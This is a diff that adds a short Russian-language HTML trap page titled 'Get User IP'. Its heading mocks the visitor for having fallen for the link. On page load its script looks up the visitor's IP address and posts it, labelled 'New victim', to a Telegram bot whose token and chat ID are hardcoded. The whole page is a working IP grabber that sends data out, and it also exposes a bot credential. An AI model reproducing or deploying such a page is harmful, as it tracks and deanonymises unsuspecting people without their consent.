@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get User IP</title>
+</head>
+<body>
+    <h1>ХААХАХАХАХАХХ ПОВЕЛСЯ ГЛУПИНЬКИЙ</h1>
+    <p id="ip-address">Получение IP-адреса...</p>
+
+    <script>
+        // Замените 'YOUR_BOT_TOKEN' на токен вашего Telegram бота
+        const BOT_TOKEN = '7539465649:AAEJLhvN4ltTiOQL99Vtq6k0OLXGGsG3cgw';
+        // Замените 'YOUR_CHAT_ID' на ваш chat_id в Telegram
+        const CHAT_ID = '1206254100';
+
+        // Функция для получения IP с помощью ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIp = data.ip;
+
+                // Отображаем IP на сайте
+                document.getElementById("ip-address").textContent = "Ваш IP-адрес: " + userIp;
+
+                // Отправляем IP-адрес в Telegram
+                const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                const message = `Новая жертва: ${userIp}`;
+
+                fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        console.log("Сообщение отправлено в Telegram");
+                    } else {
+                        console.error("Ошибка отправки сообщения");
+                    }
+                });
+            })
+            .catch(error => {
+                console.error('Ошибка получения IP:', error);
+            });
+    </script>
+</body>
+</html>
